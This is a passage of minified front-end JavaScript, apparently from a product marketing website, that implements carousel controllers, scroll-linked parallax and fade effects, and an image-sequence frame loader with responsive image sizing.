e=t.getAttribute("mqn-lazyimage-src")||t.getAttribute("mqn-lazyimage-background-src"),i=t.getAttribute("mqn-lazyimage-google-image-webp-fallback");return!i||vo()?e:e+"-"+i}preloadModalImmediateImages_(){let t=Array.from(this.element.querySelectorAll("[mqn-modal-preload-immediate]")).map((t=>this.getImageUrl_(t)));this.preloadImages_(t)}preloadModalImages_(){let t=Array.from(this.element.querySelectorAll("[mqn-modal-preload]")).map((t=>this.getImageUrl_(t)));this.preloadImages_(t)}preloadImages_(t){(t=bi.addFifeUrlParamsToUrls(t)).forEach((t=>{(new Image).src=t}))}init(t){this.ready?this.fireInit(1,t):(this.scroller=document.querySelector(".ak-modal-content"),this.content.removeAttribute("ng-non-bindable"),this.ready=!0,window.setTimeout((()=>{this.$compile(this.$element.contents())(this.$scope),this.fireInit(10,t),this.$scope.$apply()})))}closeImminent(t){window.setTimeout((()=>{this.$rootScope.$broadcast("MQN2_MODAL_CLOSE_IMMINENT",t)}))}close(t){this.fireClose(1,t)}},uA=cA,hA=class{static get $inject(){return["$rootScope","$element","$scope","$compile"]}constructor(t,e,i,r){this.el=e[0],this.initialized=!1}},fA=hA,dA="connect",pA=class{static get $inject(){return["$rootScope","$element","$scope"]}constructor(t,e,i){this.el=e[0],this.initialized=!1,i.$on("MQN_SLICK_INITIALIZED",this.slickInitialized.bind(this)),i.$on("MQN_SLICK_INVIEW",this.slickInview.bind(this))}slickInitialized(t,e){this.initialized||e.id!==dA||(this.slickCtrl=e.ctrl,this.initialized=!0)}slickInview(t,e){e.id===dA&&(e.inview?this.slickCtrl.start():this.slickCtrl.stop())}},mA=pA,gA="facematch",vA=class{static get $inject(){return["$rootScope","$element","$scope","$compile"]}constructor(t,e,i,r){this.el=e[0],this.initialized=!1,i.$on("MQN_SLICK_INITIALIZED",this.slickInitialized.bind(this)),i.$on("MQN_SLICK_INVIEW",this.slickInview.bind(this))}slickInitialized(t,e){this.initialized||e.id!==gA||(this.slickCtrl=e.ctrl,this.initialized=!0)}slickInview(t,e){e.id===gA&&(e.inview?this.slickCtrl.start():this.slickCtrl.stop())}},yA=vA,_A=ye(Jt()),aF="home",gu={INVIEW:te.mqnCssName("mqn2-newman-home--inview"),STICKY:te.mqnCssName("mqn2-newman-home__sticky"),DISCLAIMER:te.mqnCssName("mqn2-newman-home__sticky__legal-disclaimer")},bA=class{static get $inject(){return["$rootScope","$element","$scope"]}constructor(t,e,i){this.el=e[0],this.initialized=!1,i.$on("MQN_SLICK_INITIALIZED",this.slickInitialized.bind(this)),window.MQN_RESIZER&&window.MQN_RESIZER.addListener(this.resize.bind(this)),this.watcher_=Et.elementInViewWatcherFirstChangeOnly(this.el,{threshold:.2,rootMargin:"0px 0px 0px 0px"},((t,e,i)=>{e.isIntersecting?this.el.classList.add(gu.INVIEW):this.el.classList.remove(gu.INVIEW)})),Et.elementInViewWatcherFirstChangeOnly(this.el.querySelector("[mqn-section-2]"),{threshold:.7,rootMargin:"0px 0px 0px 0px"},((t,e,i)=>{!this.initialized||e.isIntersecting&&(this.slickCtrl.start(),this.oneTimeEvLoad&&this.oneTimeEvLoad.dispose())})),Et.elementInViewWatcherFirstChangeOnly(this.el.querySelector("[mqn-section-2]"),{threshold:0,rootMargin:"0px 0px 0px 0px"},((t,e,i)=>{!this.initialized||e.isIntersecting||(this.slickCtrl.stop(),this.slickCtrl.stopAtFirstVideoFrame(0,!0))})),this.setupParallax(),this.resize()}dispose_(){this.watcher_.done()}resize(){this.fixStickyChildHeight()}slickInitialized(t,e){this.initialized||e.id!==aF||(this.initialized=!0,this.slickCtrl=e.ctrl,this.oneTimeEvLoad=_A.elementVisibility.inview(this.el.querySelector("[mqn-section-2]"),{threshold:0},((t,e,i)=>{e.isIntersecting&&(this.slickCtrl.start(),i())})))}fixStickyChildHeight(){let t=this.el.querySelector("[mqn-section-2]");this.el.querySelector(`.${gu.STICKY}`).style.height=t.offsetHeight+"px"}createImageEffects(t=1){let e="transform: translateX(0) translateY(0)";return[{num:1,style:[`transform: translateX(-2.5vw) translateY(${-6*t}vh);`,e]},{num:2,style:[`transform: translateX(2vw) translateY(${-10*t}vw);`,e]},{num:3,style:[`transform: translateX(6vw) translateY(${-5*t}vw)`,e]},{num:4,style:[`transform: translateX(20vw) translateY(${-17*t}vh);`,e]},{num:5,style:[`transform: translateX(17vw) translateY(${8*t}vh);`,e]},{num:6,style:[`transform: translateX(16vw) translateY(${-12*t}vh);`,e]},{num:7,style:[`transform: translateX(-5vw) translateY(${35*t}vh);`,e]},{num:8,style:[`transform: translateX(-1vw) translateY(${40*t}vh);`,e]},{num:9,style:[`transform: translateX(-6vw) translateY(${14*t}vh);`,e]},{num:10,style:[`transform: translateX(-10vw) translateY(${35*t}vh);`,e]},{num:11,style:[`transform: translateX(-8vw) translateY(${42*t}vh);`,e]},{num:12,style:[`transform: translateX(-5vw) translateY(${27*t}vh);`,e]},{num:13,style:[`transform: translateX(1vw) translateY(${40*t}vh);`,e]},{num:14,style:[`transform: translateX(-10vw) translateY(${12*t}vh);`,e]}].map((t=>{let e=this.el.querySelector("[mqn2-section2-image-"+t.num+"]");return new Yt([[0,t.style[0]],[1,t.style[1]]],{styleTarget:e})}))}setupParallax(){let t=this.el.querySelector("[mqn-section-2]"),e=this.el.querySelector("[mqn-section-2-inner]"),i=this.el.querySelector("[mqn-fade-header-1]"),r=this.el.querySelector("[mqn-image-rows]"),n="transform: translateY(10vh)",s="transform: translateY(0%);",o=[new Yt([[0,"transform: translateY(0px)"],[1,"transform: translateY(-29vw);"]],{styleTarget:i})],a=[new Yt([[0,"transform: translateY(-50%); margin-top: 0;"],[1,"transform: translateY(-50vh); margin-top: 200px;"]],{styleTarget:i})],l=[new Yt([[0,n],[1,s]],{styleTarget:e}),new Yt([[0,n],[1,s]],{styleTarget:this.el.querySelector("[mqn-device]")}),new Yt([[0,"opacity: 1;"],[1,"opacity: 0.5;"]],{styleTarget:r})];new jr(t,{startDistance:()=>.1*-t.offsetHeight,endDistance:0,getDistanceFunction:ni.DISTANCE_FROM_DOCUMENT_TOP,condition:()=>rt.isDesktop(),effects:[new Yt([[0,"opacity: 0"],[1,"opacity: 1"]],{styleTarget:this.el.querySelector(`.${gu.DISCLAIMER}`)})]}),new jr(t,{startDistance:()=>.9*-t.offsetHeight,endDistance:()=>.1*-t.offsetHeight,getDistanceFunction:ni.DISTANCE_FROM_DOCUMENT_TOP,condition:()=>rt.isDesktopOrTablet(),effects:[...this.createImageEffects(),...l,...o]}),new jr(t,{startDistance:()=>.9*-t.offsetHeight,endDistance:()=>-.01*-t.offsetHeight,getDistanceFunction:ni.DISTANCE_FROM_DOCUMENT_TOP,condition:()=>rt.isMobile(),effects:[...this.createImageEffects(1.4),...l,...a]})}},wA=bA,Fp="photos",EA={DARK_THEME:te.mqnCssName("mqn2-newman-photos2--dark-theme")},SA=class{static get $inject(){return["$rootScope","$element","$scope"]}constructor(t,e,i){this.el=e[0],this.rl_=de.getDestroyableInstance(),this.scrollEffect=[],this.$scope=i,this.parent=this.el.querySelector("[mqn-sticky-parent]"),this.child=this.el.querySelector("[mqn-sticky-child]"),this.images=this.el.querySelector("[mqn-images]"),this.imagesInner=this.el.querySelector("[mqn-images-inner]"),this.darkTheme=!1,this.slickCtrl=null,i.$on("MQN_SLICK_INITIALIZED",this.slickInitialized.bind(this)),i.$on("MQN_SLICK_INVIEW",this.slickInview.bind(this)),i.$on("MQN_SLICK_BEFORE_CHANGE",this.slickBeforeChange.bind(this)),i.$on("destroy",(()=>this.dispose_()))}setDarkTheme(t){this.rl_.anyMutate((()=>{this.darkTheme=t,t?this.el.classList.add(EA.DARK_THEME):this.el.classList.remove(EA.DARK_THEME)}))}slickInview(t,e){e.id===Fp&&(e.inview?this.slickCtrl.start():(this.slickCtrl.stopAtFirstVideoFrame(0,!0),this.rl_.anyMutate((()=>{this.el.classList.remove(te.mqnCssName("mqn2-newman-photos2--inview"))}))))}slickInitialized(t,e){this.initialized||e.id!==Fp||(this.initialized=!0,this.slickCtrl=e.ctrl,this.inviewDipose=Et.elementInViewWatcherFirstChangeOnly(this.el,{threshold:.2},((t,e,i)=>{this.inview=e.isIntersecting,this.inview&&this.rl_.anyMutate((()=>{this.el.classList.add(te.mqnCssName("mqn2-newman-photos2--inview"))}))})))}slickBeforeChange(t,e){if(e.id!==Fp)return;let i=e.ctrl;this.slickCtrl=i,this.setDarkTheme("dark-theme"===i.currentSlide.theme),window.setTimeout((()=>{this.$scope.$apply()}))}isMobile(){return window.innerWidth<768}dispose_(){this.rl_.destroy()}},AA=SA;function CA(t){return new Promise((function(e,i){var r=new Image;r.addEventListener("load",(function(){return e(r)}),{once:!0}),r.addEventListener("error",(function(){return i(r)}),{once:!0}),r.src=t}))}function Np(t,e){e.forEach((function(e,i){return t.style.setProperty(i,e)}))}var TA=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},lF=1073741823.5,xA="\n  opacity: 0;\n  position: absolute;\n  top: 0;\n  left: 0;\n  right: 0;\n  bottom: 0;\n  width: 100%;\n  height: 100%;\n  z-index: 0;\n",cF=function(t,e,i,r){this.desiredFrame=t,this.backFrame=e,this.frontFrame=i,this.distanceAsPercent=r},Vp=Mr.getBrowser(),IA=function(){function t(e,i,r){var n=void 0===r?{}:r,s=n.createFrameFunction,o=void 0===s?function(){return document.createElement("div")}:s,a=n.startLoadingImmediately,l=void 0===a||a,h=n.loadImageFunction,c=void 0===h?CA:h,u=n.framesToInterpolate,d=void 0===u?0:u,p=n.maximumLoadingThreads,m=void 0===p?12:p,f=n.zIndexCap,g=void 0===f?lF:f;this.backupFrames_=new ti,this.lastState_=null,this.lastTargetFrame_=null,this.imageUrlsInOrder_=e,this.frameElements_=e.map((function(t,e){return o(e)})),this.imageUrlIndicesToLoadInOrder_=t.generateFrameLoadOrder(e.length),this.imagesLoaded_=0,this.loadedImageUrls_=new Set,this.container_=i,this.loadingPaused_=!l,this.displayedFrameElementIndices_=new Set,this.zIndex_=1,this.loadImageFunction_=c,this.numberOfFramesToInterpolate_=d,this.maximumParallelImageRequests_=m,this.currentParallelImageRequests_=0,this.zIndexCap_=g,this.init_()}return t.prototype.stopLoading=function(){this.loadingPaused_=!0},t.prototype.startLoading=function(){this.loadingPaused_=!1,this.areAllLoadingThreadsInUse_()||this.loadNextImage_()},t.prototype.areAllLoadingThreadsInUse_=function(){return this.currentParallelImageRequests_>=this.maximumParallelImageRequests_},t.prototype.init_=function(){this.setupFrames_(),this.startLoadingImagesWhenReady_()},t.prototype.startLoadingImagesWhenReady_=function(){var t=this;"complete"===document.readyState?this.startLoadingImages_():window.addEventListener("load",(function(){return t.startLoadingImages_()}))},t.prototype.setupFrames_=function(){var t=this,e=go(Vp===ki?xA:xA+"; display: none;");this.frameElements_.forEach((function(i){Np(i,e),t.container_.appendChild(i)}))},t.prototype.startLoadingImages_=function(){this.loadNextImage_()},t.prototype.loadNextImage_=function(){if(!(this.imagesLoaded_>=this.imageUrlIndicesToLoadInOrder_.length||this.loadingPaused_)){var t=this.imageUrlIndicesToLoadInOrder_[this.imagesLoaded_];this.loadImage_(t)}},t.prototype.loadImage_=function(t){var e=this,i=this.imageUrlsInOrder_[t];return this.currentParallelImageRequests_++,this.loadImageFunction_(i).then((function(i){if(e.currentParallelImageRequests_--,e.loadedImageUrls_.add(e.getImageUrl_(t)),Np(e.frameElements_[t],new Map([e.getBackgroundImageStyle_(t)])),e.lastState_){var r=e.lastState_.desiredFrame;r===t?(e.updateWithLoadedFrame_(r),e.lastState_=null):e.requiresUpdateForNewFrame_(t)&&e.updateWithInterpolatedFrame_(e.lastState_.distanceAsPercent,r)}e.imagesLoaded_++,e.loadNextImage_()}),(function(){e.currentParallelImageRequests_--,e.imagesLoaded_++,e.loadNextImage_()}))},t.prototype.requiresUpdateForNewFrame_=function(t){var e=t*(this.numberOfFramesToInterpolate_+1);return 0===t||t===this.imageUrlsInOrder_.length||this.lastState_.backFrame<e&&e<this.lastState_.desiredFrame||this.lastState_.desiredFrame<e&&e<this.lastState_.frontFrame},t.generateFrameLoadOrder=function(t){for(var e=[],i=1;i<t-1;i++)e.push(i);return TA([0,t-1],this.generateFrameLoadOrderLoop_(e))},t.generateFrameLoadOrderLoop_=function(t){if(t.length<=1)return t;var e=Math.floor((t.length-1)/2),i=t.slice(0,e),r=t.slice(e+1);return TA([t[e]],qt(Vt(this.generateFrameLoadOrderLoop_(i),this.generateFrameLoadOrderLoop_(r))))},t.prototype.getPreviousLoadedImageUrlIndex_=function(t){return this.getClosestFrame_(this.getPreviousLoadedImageUrlIndices_(t),t)},t.prototype.getPreviousLoadedImageUrlIndices_=function(t){return this.getLoadedImageUrlIndicesByCondition_((function(e){return e<t}))},t.prototype.getNextLoadedImageUrlIndex_=function(t){return this.getClosestFrame_(this.getNextLoadedImageUrlIndices_(t),t)},t.prototype.getClosestFrame_=function(t,e){return Cn(t,(function(t){return Math.abs(e-t)}))},t.prototype.getNextLoadedImageUrlIndices_=function(t){return this.getLoadedImageUrlIndicesByCondition_((function(e){return e>t}))},t.prototype.getLoadedImageUrlIndices_=function(){var t=this;return Array.from(new Set(Array.from(this.loadedImageUrls_).map((function(e){return t.getImageUrlIndex_(e)}))))},t.prototype.getLoadedImageUrlIndicesByCondition_=function(t){return this.getLoadedImageUrlIndices_().filter(t)},t.prototype.run=function(t,e,i){var r=this,n=this.numberOfFramesToInterpolate_+1,s=this.imageUrlsInOrder_.length*n-1,o=Math.round(new Ae(0,s).getPercentAsValue(i)),a=this.getNonInterpolatedFrame_(o);(this.resetZIndexes_(),this.lastTargetFrame_!==o)&&(null!==(this.isInterpolatedFrame_(o)?null:this.getLoadedImageUrlForIndex_(a))?this.updateWithLoadedFrame_(a):this.updateWithInterpolatedFrame_(i,o));de.cleanup((function(){return r.lastTargetFrame_=o}))},t.prototype.hasLoadedImageUrlForIndex_=function(t){return null!==this.getLoadedImageUrlForIndex_(t)},t.prototype.getLoadedImageUrlForIndex_=function(t){var e=this,i=this.imageUrlsInOrder_[t];return this.loadedImageUrls_.has(i)?i:this.backupFrames_.get(t).find((function(t){return e.loadedImageUrls_.has(t)}))||null},t.prototype.getNonInterpolatedFrame_=function(t){return t/(this.numberOfFramesToInterpolate_+1)},t.prototype.isInterpolatedFrame_=function(t){return t%(this.numberOfFramesToInterpolate_+1)!=0},t.prototype.resetZIndexes_=function(){if(!(this.zIndex_<this.zIndexCap_)){var t=this.zIndex_-4;this.zIndex_=4,this.frameElements_.forEach((function(e){var i=Math.max(0,parseInt("0"+e.style.zIndex)-t);de.anyMutate((function(){e.style.zIndex=""+i}))}))}},t.prototype.updateWithLoadedFrame_=function(t){this.lastState_=null,this.clearFrames_(new Set([t])),this.setFrameStyle_(t,"1")},t.prototype.getBackgroundImageStyle_=function(t){return["background-image","url("+this.imageUrlsInOrder_[t]+")"]},t.prototype.getImageUrl_=function(t){return this.imageUrlsInOrder_[t]},t.prototype.getImageUrlIndex_=function(t){var e=this,i=this.imageUrlsInOrder_.indexOf(t);return-1!==i?i:Array.from(this.backupFrames_.keys()).find((function(i){return-1!==e.backupFrames_.get(i).indexOf(t)}))},t.prototype.clearFrames_=function(t){var e,i=this;(void 0===t&&(t=null),Vp!==ki)&&(e=t?Xn(this.displayedFrameElementIndices_,t):this.displayedFrameElementIndices_,de.anyMutate((function(){e.forEach((function(t){i.frameElements_[t].style.opacity="0",i.frameElements_[t].style.display="none"}))})))},t.prototype.setFrameStyle_=function(t,e){var i=this;void 0!==t&&de.anyMutate((function(){i.displayedFrameElementIndices_.add(t),i.frameElements_[t].style.opacity=e,Vp===ki?i.frameElements_[t].style.zIndex=""+ ++i.zIndex_:i.frameElements_[t].style.display="block"}))},t.prototype.updateWithInterpolatedFrame_=function(t,e){var i=this.getNonInterpolatedFrame_(e),r=this.getNextLoadedImageUrlIndex_(i),n=this.getPreviousLoadedImageUrlIndex_(i),s=this.getFrontFrameCrossfadeOpacity_(t,r,n);this.clearFrames_(new Set([n,r])),this.updateBackFrameWithMissingFrame_(n),this.updateFrontFrameWithMissingFrame_(r,s),this.lastState_=new cF(e,n,r,t)},t.prototype.getFrontFrameCrossfadeOpacity_=function(t,e,i){var r=e/this.imageUrlsInOrder_.length,n=i/this.imageUrlsInOrder_.length;return new Ae(n,r).getValueAsPercent(t)},t.prototype.updateBackFrameWithMissingFrame_=function(t){this.setFrameStyle_(t,"1")},t.prototype.updateFrontFrameWithMissingFrame_=function(t,e){this.setFrameStyle_(t,""+e)},t.prototype.replaceFramesInPlace=function(t){var e=this;t.length!==this.imageUrlsInOrder_.length&&ct.throw("Can only replaceFramesInPlace if frame count is constant"),this.imageUrlsInOrder_.forEach((function(t,i){e.loadedImageUrls_.has(t)&&e.backupFrames_.get(i).push(t)})),this.imageUrlsInOrder_=t,this.imagesLoaded_=0,this.startLoadingImagesWhenReady_()},t.prototype.destroy=function(){var t=this;this.loadedImageUrls_.clear(),this.backupFrames_.clear(),this.frameElements_.forEach((function(e){return t.container_.removeChild(e)}))},t}(),PA=ye(gt()),uF=Mr.getBrowser()===ki,vu=class{constructor(){this.width=window.innerWidth,this.pixelRatio=window.devicePixelRatio}equals(t){return this.width===t.width&&this.pixelRatio===t.pixelRatio}getSuggestedFifeWidth(){return uF||PA.is.ipad()?Math.round(this.width):Math.round(this.width*this.pixelRatio)}};function hF(t){function e(t){let e="";for(let i=t.length-1;i>=0;i--)e+=t[i];return e}let i=e(t).split("/")[0],r=i.split("=")[0];return i===r?null:e(r)}function fF(t){return"w"===t[0]&&!isNaN(t.slice(1))}function OA(t){if(!yo(t))return t;let e=new vu,i=hF(t),r=t,n=new Set;null!==i?n=new Set(i.split("-")):"="!==r.slice(-1)[0]&&(r=`${r}=`),vo()&&(n.has("rw")||(r="="===r.slice(-1)[0]?`${r}rw`:`${r}-rw`));let s=Array.from(n.values()).find(fF),o=`w${e.getSuggestedFifeWidth()}`;return r=s?r.replace(s,o):"="===r.slice(-1)[0]?`${r}${o}`:`${r}-${o}`,r}var qp=class extends IA{constructor(t,e,i={}){super(t.map((t=>OA(t))),e,Object.assign({zIndexCap:50},i)),this.lastWindowValues=new vu,this.rawFrames=t,this.mqn2TrackWindowChanges_()}mqn2TrackWindowChanges_(){de.measure((()=>{de.cleanup((()=>this.mqn2TrackWindowChanges_()));let t=new vu;if(!t.equals(this.lastWindowValues)){let e=this.rawFrames.map((t=>OA(t)));this.replaceFramesInPlace(e),this.lastWindowValues=t}}))}},dF=new wi({multiplier:1}),RA=class{static get $inject(){return["$rootScope","$element","$scope","$compile"]}constructor(t,e,i,r){this.el=e[0],this.images_=JSON.parse(this.el.getAttribute("data-desktop-frames")),this.scrollContainer_=this.el.querySelector("[mqn-container]"),this.frame_=this.el.querySelector("[mqn-speaker-frame]"),this.chapter_=this.el.querySelector("[mqn-chapter]"),this.chapterInner_=this.el.querySelector("[mqn-chapter-inner]"),this.button1_=this.el.querySelector("[mqn-button-1]"),this.button2_=this.el.querySelector("[mqn-button-2]"),this.backgrounds=Array.from(document.querySelectorAll("[mqn-background-color-shift]")),this.images_=this.images_.map((t=>dF.processImage(t))),this.frameEffect=new qp(this.images_,this.frame_,{startLoadingImmediately:!1}),window.scrollY>0?this.frameEffect.startLoading():window.addEventListener("scroll",(()=>{this.frameEffect.startLoading()}),{once:!0});let n={startDistance:()=>120,endDistance:()=>.5*this.scrollContainer_.offsetHeight,getDistanceFunction:ni.DISTANCE_FROM_DOCUMENT_TOP},s=Object.assign({effects:[this.frameEffect,new Yt([[.2,"opacity: 0; transform: translateY(60px);"],[.3,"opacity: 1; transform: translateY(0px);"],[.6,"opacity: 1; transform: translateY(0px);"],[.8,"opacity: 0; transform: translateY(-60px);"]],{styleTarget:this.button1_}),new Yt([[0,"opacity: 0;"],[.8,"opacity: 0; transform: translateY(60px);"],[.9,"opacity: 1; transform: translateY(0px);"]],{styleTarget:this.button2_})],condition:()=>window.innerWidth>=768},n);this.desktopScrollEffect_=new jr(this.scrollContainer_,s);let o=Object.assign({effects:[this.frameEffect,new Yt([[.2,"opacity: 0; transform: translateY(30px);"],[.3,"opacity: 1; transform: translateY(0px);"],[.5,"opacity: 1; transform: translateY(0px);"],[.7,"opacity: 0; transform: translateY(-30px);"]],{styleTarget:this.button1_}),new Yt([[.2,"opacity: 0; transform: translateY(30px);"],[.3,"opacity: 1; transform: translateY(0px);"],[.5,"opacity: 1; transform: translateY(0px);"],[.7,"opacity: 0; transform: translateY(-30px);"]],{styleTarget:this.button1_}),new Yt([[.2,"opacity: 0; transform: translateY(30px);"],[.3,"opacity: 1; transform: translateY(0px);"],[.5,"opacity: 1; transform: translateY(0px);"],[.7,"opacity: 0; transform: translateY(-30px);"]],{styleTarget:this.button1_}),new Yt([[0,"opacity: 0;"],[.8,"opacity: 0; transform: translateY(30px);"],[.9,"opacity: 1; transform: translateY(0px);"]],{styleTarget:this.button2_})],condition:()=>window.innerWidth<768},n);this.mobileScrollEffect_=new jr(this.scrollContainer_,o),this.scrollEffect_=new jr(this.scrollContainer_,{startDistance:()=>.6*-window.innerHeight,endDistance:()=>.3*this.scrollContainer_.offsetHeight,getDistanceFunction:ni.DISTANCE_FROM_DOCUMENT_TOP,percentCallbacks:[[.15,[(t,e,i,r,n)=>{1===Math.sign(e-r)?this.frame_.classList.add("active"):this.frame_.classList.remove("active")}]]],effects:[new Yt([[0,"background-color: #191818"],[.12,"background-color: #F7F5F4"]],{styleTarget:this.backgrounds[0]}),new Yt([[0,"background-color: #191818"],[.12,"background-color: #F7F5F4"]],{styleTarget:this.backgrounds[1]}),new Yt([[.3,"opacity: 0; transform: translateY(30px)"],[.35,"opacity: 1; transform: translateY(0)"]],{styleTarget:this.chapterInner_}),new Yt([[.5,"opacity: 1"],[.6,"opacity: 0"]],{styleTarget:this.chapter_}),new Yt([[0,"transform: scale(0.97);"],[.3,"transform: scale(1);"],[.6,"transform: scale(1);"],[1,"transform: translateY(10vh)"]],{styleTarget:this.frame_})]}),i.$on("$destroy",(()=>{this.dispose_()}))}dispose_(){this.mobileScrollEffect_.destroy(),this.desktopScrollEffect_.destroy(),this.scrollEffect_.destroy()}},MA=RA;function Ei(t,e){var i=parseFloat(vt(t,e));return isNaN(i)?1:i}function $A(t){return Ei(t,"opacity")}function Io(t){return void 0===t&&(t=null),t?t.offsetHeight:gi.clientHeight}function LA(t,e){void 0===e&&(e=null);var i=zr(t,e),r=Io(e),n=new Ae(0,r),s=n.clamp(i);return n.clamp(i+t.offsetHeight)-s}function pF(t){for(var e=t,i=0;e&&e!==document.body;){if("fixed"===vt(e,"position"))return i+e.offsetLeft;var r=Je.fromElementTransform(e);i+=e.offsetLeft+r.x-e.scrollLeft,e=e.offsetParent}var n=_i.getSingleton(this),s=n.getPosition().invert();return n.destroy(this),i+s.x}function mF(t){return"fixed"===vt(t,"position")?t.offsetLeft:t.offsetLeft+Je.fromElementTransform(t).x+pF(t.offsetParent)}var DA=function(){function t(){this.cache_=Xe.usingFunction((function(t){return mF(t)})),this.init_()}return t.prototype.init_=function(){this.renderLoop_()},t.prototype.getVisibleDistanceFromRoot=function(t){return this.cache_.get(t)},t.prototype.renderLoop_=function(){var t=this;de.anyMutate((function(){de.anyCleanup((function(){t.cache_.clear(),t.renderLoop_()}))}))},t.getSingleton=function(){return this.singleton_=this.singleton_||new this},t.singleton_=null,t}(),gF=DA.getSingleton();function Po(t){return gF.getVisibleDistanceFromRoot(t)}function yu(t,e){return void 0===e&&(e=null),null!==e?Po(t)-Po(e):Po(t)}function _u(t,e){void 0===e&&(e=null);var i=yu(t,e),r=e?e.offsetWidth:er.clientWidth,n=new Ae(0,r),s=n.clamp(i);return n.clamp(i+t.offsetWidth)-s}function kA(t,e){return void 0===e&&(e=null),new sr(_u(t,e),LA(t,e))}function FA(t){return Ot(t)&&"hidden"!==vt(t,"visibility")}function NA(t,e,i){if(void 0===e&&(e=null),void 0===i&&(i=!1),!FA(t))return 0;var r=i?$A(t):1;return kA(t,e).getArea()*r}function VA(t,e,i){return void 0===e&&(e=null),void 0===i&&(i=!1),NA(t,e,i)>0}function bu(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=new Set;return t.forEach((function(t){t.forEach((function(t){i.add(t)}))})),i}var vF=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},Oo=function(){function t(){this.syncedCarousels_=[]}return t.getSingleton=function(){return this.singleton_=this.singleton_||new this},t.prototype.getSetForCarousel_=function(t){return this.syncedCarousels_.find((function(e){return e.has(t)}))},t.prototype.syncCarousels=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=[],r=[new Set(t)];this.syncedCarousels_.forEach((function(e){t.find((function(t){return e.has(t)}))?r.push(e):i.push(e)})),this.syncedCarousels_=vF(i,[bu.apply(void 0,r)])},t.prototype.transitionToIndex=function(t,e){var i=this.getSetForCarousel_(t);!i||i.forEach((function(i){i!==t&&i.transitionToIndex(e,!0)}))},t.prototype.destroyCarousel=function(t){this.syncedCarousels_.forEach((function(e){return e.delete(t)})),this.syncedCarousels_=this.syncedCarousels_.filter((function(t){return t.size>0}))},t.prototype.destroy=function(){this.syncedCarousels_=[]},t.singleton_=null,t}(),qA=function(){function t(){this.activeSlides_=new Map}return t.prototype.init=function(t,e){this.activeSlides_.set(e,t)},t.prototype.getActiveSlide=function(t){return this.activeSlides_.get(t)},t.prototype.transition=function(t,e){this.activeSlides_.set(e,t)},t.prototype.hasTransitionedTo=function(t,e){return this.activeSlides_.get(e)===t},t.prototype.renderLoop=function(t){},t}();function BA(t,e){var i=(t.length-1)/2;return i%2==0?i:e?Math.ceil(i):Math.floor(i)}function WA(t,e,i,r){for(var n=[],s=t.length,o=e;n.length<i;)o=(o+r+s)%s,r>0?n.push(t[o]):n.unshift(t[o]);return n}function Bp(t,e,i){void 0===i&&(i=!0);var r=BA(t,!i),n=BA(t,i),s=t.indexOf(e);return[WA(t,s,r,-1),WA(t,s,n,1)]}var yF=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},_F=new qA,UA=Symbol("interaction"),Wp=Object.freeze({ACTIVE_SLIDE:"active",BEFORE_SLIDE:"before",AFTER_SLIDE:"after"}),bF=function(){function t(t,e){void 0===e&&(e=!1),this.element_=t,this.drivenBySync_=e}return t.prototype.getElement=function(){return this.element_},t.prototype.isDrivenBySync=function(){return this.drivenBySync_},t}(),Up=function(){function t(t,e,i){var r=this,n=void 0===i?{}:i,s=n.condition,o=void 0===s?function(){return!0}:s,a=n.onTransitionCallbacks,l=void 0===a?[]:a,h=n.onDestroyCallbacks,c=void 0===h?[]:h,u=n.activeCssClass,d=void 0===u?Wp.ACTIVE_SLIDE:u,p=n.beforeCssClass,m=void 0===p?Wp.BEFORE_SLIDE:p,f=n.afterCssClass,g=void 0===f?Wp.AFTER_SLIDE:f,y=n.allowLooping,v=void 0===y||y,_=n.transition,b=void 0===_?_F:_;e.length<1&&ct.throw("Cannot start carousel without slides"),this.activeCssClass_=d,this.beforeCssClass_=m,this.afterCssClass_=g,this.allowLooping_=v,this.condition_=o,this.container_=t,this.lastActiveSlide_=null,this.onTransitionCallbacks_=l,this.onDestroyCallbacks_=c,this.slides_=e,this.transition_=b,this.transitionTarget_=null,this.interactions_=[],this.destroyed_=!1,this.disabled_=!1,this.renderLoopCallback_=null,this.slideCssClasses_=Xe.usingFunction((function(){return new Set})),this.activeCssClassSet_=new Set([d]),this.beforeCssClassMap_=Xe.usingFunction((function(t){return new Set([r.beforeCssClass_,r.beforeCssClass_+"--"+t])})),this.afterCssClassMap_=Xe.usingFunction((function(t){return new Set([r.afterCssClass_,r.afterCssClass_+"--"+t])})),this.init_()}return t.prototype.allowsLooping=function(){return this.allowLooping_},t.prototype.getLastActiveSlide=function(){return this.lastActiveSlide_},t.prototype.clearTransitionTarget_=function(){this.transitionTarget_=null},t.prototype.transitionToSlide=function(t,e){void 0===e&&(e=!1),!this.isBeingInteractedWith()&&(this.transitionTarget_=new bF(t,e))},t.prototype.init_=function(){this.transition_.init(this.getSlides()[0],this),this.render_()},t.prototype.isTransitioning=function(){return null!==this.transitionTarget_},t.prototype.isBeingInteractedWith=function(t){return void 0===t&&(t=null),this.interactions_.length>0&&(!uo(t)||-1!==this.interactions_.indexOf(t))},t.prototype.isIdle=function(){return!this.isTransitioning()&&!this.isBeingInteractedWith()},t.prototype.render_=function(){var t=this;this.destroyed_||(this.renderLoopCallback_=de.measure((function(){if(de.cleanup((function(){return t.render_()})),!t.disabled_&&t.condition_()){var e=t.handleTransition_();t.transition_.renderLoop(t);var i=t.getActiveSlide();i!==t.lastActiveSlide_&&(t.lastActiveSlide_=i,t.onTransitionCallbacks_.forEach((function(e){return e(t)})),i&&(t.renderLoopCallback_=de.mutate((function(){return t.updateClasses_(i)}))),e&&Oo.getSingleton().transitionToIndex(t,t.getSlideIndex(i)))}})))},t.prototype.updateClasses_=function(t){var e=this,i=this.getSlidesBefore(t),r=this.getSlidesAfter(t),n=function(t,i){var 